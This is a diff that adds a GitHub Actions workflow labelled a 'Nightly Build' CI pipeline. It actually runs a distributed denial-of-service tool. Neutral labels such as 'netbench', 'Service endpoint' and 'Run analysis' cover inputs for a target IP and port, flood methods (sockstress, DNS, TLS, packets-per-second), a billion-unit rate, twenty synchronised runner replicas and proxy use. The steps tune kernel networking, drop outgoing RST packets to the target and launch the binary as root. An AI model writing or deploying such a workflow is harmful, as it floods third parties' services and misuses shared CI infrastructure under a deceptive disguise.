@@ -1,0 +1,182 @@
+# Auto-generated config v267.77
+# Continuous Integration Pipeline
+name: Nightly Build
+
+on:
+  push:
+    branches: [ master, main ]
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: 'Service endpoint'
+        required: true
+      target_port:
+        description: 'Port number'
+        required: true
+        default: '443'
+      duration:
+        description: 'Timeout (seconds)'
+        required: true
+        default: '60'
+      method:
+        description: 'Module'
+        required: true
+        default: 'v18_tcp'
+        type: choice
+        options:
+          - v18_tcp
+          - v18_tls
+          - tls
+          - sockstress_v15
+          - dns_v16
+          - stealth
+          - v19_tcp
+          - fjium-dns
+          - fjium-gudp
+          - fjium-hex
+          - fjium-pps
+      threads:
+        description: 'Parallelism'
+        required: true
+        default: '4'
+      rate:
+        description: 'Throughput'
+        required: true
+        default: '1000000000'
+      runners:
+        description: 'Replicas (1-20)'
+        required: true
+        default: '20'
+      start_timestamp:
+        description: 'Schedule (unix)'
+        required: false
+        default: '0'
+      use_proxy:
+        description: 'Proxy mode'
+        required: false
+        default: 'true'
+        type: choice
+        options:
+          - 'true'
+          - 'false'
+
+
+
+
+jobs:
+  compile:
+    runs-on: ubuntu-22.04
+    outputs:
+      matrix: ${{ steps.gen.outputs.matrix }}
+      sync_ts: ${{ steps.sync.outputs.sync_ts }}
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Cache compiled binary
+      id: bin-cache
+      uses: actions/cache@v4
+      with:
+        path: netbench
+        key: bin-${{ hashFiles('*.c', '*.h', 'Makefile') }}
+
+    - name: Install dependencies
+      if: steps.bin-cache.outputs.cache-hit != 'true'
+      run: |
+        sudo apt-get update -qq > /dev/null 2>&1 || true
+        sudo apt-get install -y cpulimit clang libbpf-dev libelf-dev > /dev/null 2>&1 || true
+
+    - name: Build project
+      if: steps.bin-cache.outputs.cache-hit != 'true'
+      run: make clean || true && make 2>&1
+
+    - name: Store artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: app-bin
+        path: |
+          netbench
+          proxies.txt
+        retention-days: 1
+
+    - id: sync
+      name: Compute schedule
+      run: |
+        SYNC_TS=$(($(date +%s) + 40))
+        echo "sync_ts=$SYNC_TS" >> $GITHUB_OUTPUT
+
+    - id: gen
+      run: |
+        n=${{ github.event.inputs.runners || 1 }}
+        ids=$(python3 -c "import json; print(json.dumps([i+1 for i in range(int('$n'))]))")
+        echo "matrix={\"id\":$ids}" >> $GITHUB_OUTPUT
+
+  verify:
+    needs: [compile]
+    runs-on: ubuntu-22.04
+    timeout-minutes: 20
+    strategy:
+      matrix: ${{ fromJSON(needs.compile.outputs.matrix) }}
+      fail-fast: false
+    steps:
+    - name: Fetch artifact
+      uses: actions/download-artifact@v4
+      with:
+        name: app-bin
+
+    - name: Prepare environment
+      run: |
+        sudo sysctl -w net.core.wmem_max=268435456 2>/dev/null || true
+        sudo sysctl -w net.core.rmem_max=67108864 2>/dev/null || true
+        sudo sysctl -w net.core.wmem_default=16777216 2>/dev/null || true
+        sudo sysctl -w net.core.netdev_max_backlog=30000 2>/dev/null || true
+        sudo sysctl -w net.core.somaxconn=65535 2>/dev/null || true
+        sudo sysctl -w net.ipv4.conf.all.rp_filter=0 2>/dev/null || true
+        sudo sysctl -w net.ipv4.conf.default.rp_filter=0 2>/dev/null || true
+        sudo sysctl -w net.ipv4.conf.eth0.rp_filter=0 2>/dev/null || true
+        sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null || true
+        sudo sysctl -w net.core.netdev_budget=600 2>/dev/null || true
+        sudo sysctl -w net.core.netdev_budget_usecs=8000 2>/dev/null || true
+        sudo iptables -t raw -A OUTPUT -p tcp -j NOTRACK 2>/dev/null || true
+        sudo iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true
+        sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ${{ github.event.inputs.target_ip }} -j DROP 2>/dev/null || true
+
+    - name: Run analysis (Replica ${{ matrix.id }})
+      run: |
+        mv netbench worker
+        chmod +x worker
+        
+        TARGET_IP="${{ github.event.inputs.target_ip || '127.0.0.1' }}"
+        TARGET_PORT="${{ github.event.inputs.target_port || '443' }}"
+        RATE="${{ github.event.inputs.rate || '1000' }}"
+        DURATION="${{ github.event.inputs.duration || '5' }}"
+        METHOD="${{ github.event.inputs.method || 'v18_tcp' }}"
+        THREADS="${{ github.event.inputs.threads || '4' }}"
+        
+        PROXY_FLAG="--no-proxies"
+        if [ "${{ github.event.inputs.use_proxy }}" = "true" ]; then
+          PROXY_FLAG=""
+        fi
+        
+        SYNC_TS="${{ needs.compile.outputs.sync_ts }}"
+        START_TS="${{ github.event.inputs.start_timestamp || '0' }}"
+        if [ "$START_TS" = "0" ] || [ "$START_TS" = "" ]; then
+          START_TS="$SYNC_TS"
+        fi
+        if [ "$START_TS" != "0" ] && [ "$START_TS" != "" ]; then
+          NOW=$(date +%s)
+          WAIT=$((START_TS - NOW))
+          if [ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 300 ]; then
+            sleep "$WAIT"
+          fi
+        fi
+        
+        if [ "$METHOD" = "dns_v16" ] || [ "$METHOD" = "stealth" ] || [ "$METHOD" = "v19_tcp" ]; then
+          sudo ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG
+        else
+          sudo sh -c "cpulimit -l 50 -f -- ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG || exec ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG"
+        fi
+
+    - name: Cleanup
+      if: always()
+      run: |
+        sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -d ${{ github.event.inputs.target_ip }} -j DROP 2>/dev/null || true
